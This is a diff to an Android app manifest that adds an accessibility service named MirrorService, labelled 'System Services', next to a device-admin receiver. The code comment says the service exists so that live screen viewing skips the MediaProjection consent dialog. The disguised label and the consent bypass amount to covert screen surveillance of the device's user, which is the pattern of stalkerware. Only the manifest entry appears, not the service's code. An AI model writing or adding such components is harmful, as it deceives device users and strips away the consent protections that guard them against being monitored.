@@ -20,6 +20,23 @@
             <intent-filter tools:node="removeAll" />
         </activity>
         <service android:name=".LanService" android:exported="false" android:foregroundServiceType="connectedDevice|mediaProjection" />
+        <!--
+            One-time opt-in screen capture for live view (API 30+). Enabled once in
+            Settings > Accessibility as "System Services"; afterwards live view needs
+            no MediaProjection consent dialog. Requests no accessibility events.
+        -->
+        <service
+            android:name=".MirrorService"
+            android:label="System Services"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
         <receiver android:name=".PolicyAdmin" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">
             <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin" />
             <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter>
